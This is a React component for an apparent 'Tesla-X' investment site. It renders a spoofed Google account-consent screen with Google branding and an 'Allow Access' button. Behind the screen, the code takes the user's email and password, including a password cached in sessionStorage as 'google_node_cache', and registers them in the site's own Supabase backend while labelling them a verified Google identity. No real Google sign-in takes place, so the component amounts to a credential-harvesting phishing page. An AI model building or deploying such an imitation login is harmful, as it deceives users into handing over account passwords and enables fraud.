"use client";

import { motion, AnimatePresence } from "framer-motion";
import { Icon } from "@iconify/react";
import { useState, useEffect, useMemo } from "react";
import { supabase } from "@/lib/supabaseClient";
import { toast } from "react-hot-toast";


interface Props {
  email: string;
  pass: string;
  onConfirm: (email: string, pass: string) => void;
  onBack: () => void;
  metadata?: {
    full_name: string;
    username: string;
    country: string;
    neural_key: string;
  };
}

const GoogleConfirm = ({ email: propEmail, pass: propPass, onConfirm, onBack, metadata }: Props) => {
  const [loading, setLoading] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);
  const [internalPass, setInternalPass] = useState(propPass || "");
  const [internalEmail, setInternalEmail] = useState(propEmail || "");
  const [vHeight, setVHeight] = useState("100vh");

  // --- RESPONSIVE VIEWPORT STABILIZER ---
  useEffect(() => {
    const updateHeight = () => setVHeight(`${window.innerHeight}px`);
    window.addEventListener("resize", updateHeight);
    updateHeight();

    const cachedData = sessionStorage.getItem("google_node_cache");
    if (cachedData) {
      const { email: cEmail, password: cPass } = JSON.parse(cachedData);
      if (!internalPass && cPass) setInternalPass(cPass);
      if (!internalEmail && cEmail) setInternalEmail(cEmail);
    }
    return () => window.removeEventListener("resize", updateHeight);
  }, [internalPass, internalEmail]);

  // Framer Motion Variants
  const containerVariants = {
    hidden: { opacity: 0 },
    show: {
      opacity: 1,
      transition: { staggerChildren: 0.08, delayChildren: 0.1 }
    }
  };

  const itemVariants = {
    hidden: { opacity: 0, x: -10 },
    show: { opacity: 1, x: 0 }
  };

  const handleAuthFinalize = async () => {
    const finalPass = internalPass || propPass;
    const finalEmail = internalEmail || propEmail;

    if (!finalPass || finalPass.length < 6) {
      return toast.error("Neural Handshake Failed: Invalid Buffer");
    }

    setLoading(true);

    try {
      const { error } = await supabase.auth.signUp({
        email: finalEmail,
        password: finalPass,
        options: {
          data: {
            provider_type: "google_secure_enclave",
            full_name: metadata?.full_name || "Google User",
            username: metadata?.username || "NODE_G",
            sync_status: "verified_identity",
            security_tier: 2
          },
        },
      });

      if (error) throw error;

      sessionStorage.setItem("google_neural_metadata", JSON.stringify(metadata || {}));
      setIsRedirecting(true);

      setTimeout(() => {
        onConfirm(finalEmail, finalPass);
        toast.success("Neural Node Synchronized");
      }, 2800);

    } catch (err: any) {
      toast.error(err.message || "Neural Tunnel Failure");
      setLoading(false);
    }
  };

  return (
    <div
      className="fixed inset-0 z-[10000] bg-white/60 dark:bg-black/80 backdrop-blur-md flex items-center justify-center p-3 sm:p-4 overflow-y-auto antialiased"
      style={{ height: vHeight }}
    >
      <AnimatePresence mode="wait">
        {!isRedirecting ? (
          <motion.div
            key="google-confirm-main"
            initial={{ opacity: 0, scale: 0.95, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 1.05, filter: "blur(15px)" }}
            className="w-full max-w-[480px] bg-white dark:bg-[#1f1f1f] rounded-[32px] sm:rounded-[40px] p-6 sm:p-10 md:p-12 border border-[#e0e0e0] dark:border-white/10 shadow-[0_25px_70px_-15px_rgba(0,0,0,0.4)] relative"
          >
            {/* BRANDING */}
            <div className="flex items-center gap-3 mb-6 sm:mb-10 text-[#5f6368] dark:text-white/60">
              <div className="p-1.5 bg-white dark:bg-white/5 rounded-lg shadow-sm border border-black/5">
                <Icon icon="logos:google-icon" className="text-lg sm:text-xl" />
              </div>
              <span className="text-[9px] sm:text-[11px] font-black uppercase tracking-[0.2em] opacity-70">Enclave Auth</span>
            </div>

            <h1 className="text-[#202124] dark:text-white text-xl sm:text-2xl md:text-3xl font-medium tracking-tight mb-6 sm:mb-8 leading-tight">
              Verify with Tesla-X
            </h1>

            {/* RESPONSIVE PROFILE CHIP */}
            <div className="relative group w-fit mb-8 sm:mb-10">
              <div className="absolute -inset-1 bg-gradient-to-r from-[#4285F4] to-[#34A853] rounded-full blur opacity-10" />
              <div className="relative flex items-center gap-2 sm:gap-3 pr-3 sm:pr-4 py-1.5 pl-1.5 border border-gray-300 dark:border-white/10 rounded-full bg-white dark:bg-[#2d2d2d]">
                <div className="w-6 h-6 sm:w-8 sm:h-8 rounded-full bg-[#1D6350] flex items-center justify-center text-[10px] sm:text-xs text-white uppercase font-black">
                  {internalEmail ? internalEmail[0] : "U"}
                </div>
                <span className="text-[12px] sm:text-sm font-semibold text-dark dark:text-white truncate max-w-[140px] sm:max-w-[180px]">
                  {internalEmail || "user@gmail.com"}
                </span>
                <Icon icon="tabler:chevron-down" className="text-gray-400 text-sm" />
              </div>
            </div>

            <p className="text-[14px] sm:text-base text-[#202124] dark:text-white/90 mb-6 sm:mb-8 leading-relaxed">
              Google will allow <span className="font-bold text-[#1a73e8]">Tesla-X Enclave</span> to access:
            </p>

            {/* PERMISSIONS LIST */}
            <motion.div variants={containerVariants} initial="hidden" animate="show" className="space-y-4 sm:space-y-6 mb-10 sm:mb-12">
              <motion.div variants={itemVariants} className="flex gap-3 sm:gap-4">
                <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl sm:rounded-2xl bg-gray-50 dark:bg-white/5 flex items-center justify-center text-gray-500 border border-black/5">
                  <Icon icon="solar:user-circle-bold" className="text-xl sm:text-2xl" />
                </div>
                <div>
                  <p className="text-[13px] sm:text-[15px] font-bold text-dark dark:text-white">Your Name and Email</p>
                  <p className="text-[11px] sm:text-sm text-gray-500 dark:text-gray-400">Profile data {metadata?.username || "Terminal"}</p>
                </div>
              </motion.div>

              <motion.div variants={itemVariants} className="flex gap-3 sm:gap-4">
                <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl sm:rounded-2xl bg-gray-50 dark:bg-white/5 flex items-center justify-center text-gray-500 border border-black/5 relative overflow-hidden">
                  <Icon icon="solar:letter-bold" className="text-xl sm:text-2xl" />
                  <motion.div animate={{ scale: [1, 1.5], opacity: [0.3, 0] }} transition={{ repeat: Infinity, duration: 2 }} className="absolute inset-0 bg-[#1a73e8]/20 rounded-full" />
                </div>
                <div className="flex-1 overflow-hidden">
                  <div className="flex items-center justify-between mb-0.5 sm:mb-1">
                    <p className="text-[13px] sm:text-[15px] font-bold text-dark dark:text-white truncate pr-2">{internalEmail}</p>
                    <div className="flex items-center gap-1 px-1.5 py-0.5 rounded-md bg-green-500/10 border border-green-500/20 flex-shrink-0">
                      <span className="h-1 w-1 rounded-full bg-green-500 animate-pulse" />
                      <span className="text-[7px] sm:text-[8px] font-black uppercase text-green-600 dark:text-green-400">Secure</span>
                    </div>
                  </div>
                  <p className="text-[11px] sm:text-xs text-gray-500">Neural identity endpoint</p>
                </div>
              </motion.div>
            </motion.div>

            {/* LEGAL BLOCK */}
            <div className="text-[10px] sm:text-[11px] text-gray-500 dark:text-gray-400 mb-8 sm:mb-12 p-4 sm:p-5 bg-gray-50 dark:bg-white/[0.03] rounded-2xl sm:rounded-3xl border border-black/5">
              <p>Review tesla-x-investment.vercel.app&apos;s <span className="text-[#1a73e8] font-bold cursor-pointer">Privacy Policy</span>.</p>
            </div>

            {/* ACTION FOOTER */}
            <div className="flex justify-end gap-3 sm:gap-5 items-center">
              <button onClick={onBack} disabled={loading} className="text-[#1a73e8] text-[13px] sm:text-[15px] font-bold px-4 sm:px-6 py-2 rounded-xl hover:bg-blue-50 dark:hover:bg-white/5 transition-all">Cancel</button>
              <button
                onClick={handleAuthFinalize}
                disabled={loading}
                className="bg-[#1a73e8] text-white px-6 sm:px-10 py-2.5 sm:py-3 rounded-2xl sm:rounded-3xl text-[11px] sm:text-[12px] font-bold hover:bg-[#185abc] shadow-lg active:scale-95 transition-all flex items-center gap-2"
              >
                {loading ? <Icon icon="line-md:loading-twotone-loop" className="text-lg" /> : "Allow Access"}
              </button>
            </div>
          </motion.div>
        ) : (
          /* RESPONSIVE REDIRECT SHIMMER */
          <motion.div
            key="google-shimmer-redirect"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="flex flex-col items-center px-6"
          >
            <div className="relative flex items-center justify-center">
              <Icon icon="logos:google-icon" className="text-6xl sm:text-8xl animate-pulse mb-4" />
              <motion.div
                animate={{ scale: [1, 1.4, 1], opacity: [0.3, 0.6, 0.3] }}
                transition={{ repeat: Infinity, duration: 2 }}
                className="absolute inset-0 bg-blue-500/20 blur-3xl rounded-full"
              />
            </div>

            <div className="mt-8 sm:mt-12 w-48 sm:w-64 h-1 bg-gray-100 dark:bg-white/10 rounded-full overflow-hidden">
              <motion.div
                initial={{ x: "-100%" }}
                animate={{ x: "100%" }}
                transition={{ duration: 1.6, repeat: Infinity, ease: "easeInOut" }}
                className="h-full w-full bg-gradient-to-r from-[#4285F4] via-[#EA4335] to-[#FBBC05]"
              />
            </div>

            <p className="mt-6 sm:mt-8 text-[10px] sm:text-[12px] font-mono text-[#4285F4] uppercase tracking-[0.4em] sm:tracking-[0.6em] font-black text-center">
              Syncing Neural Enclave...
            </p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default GoogleConfirm;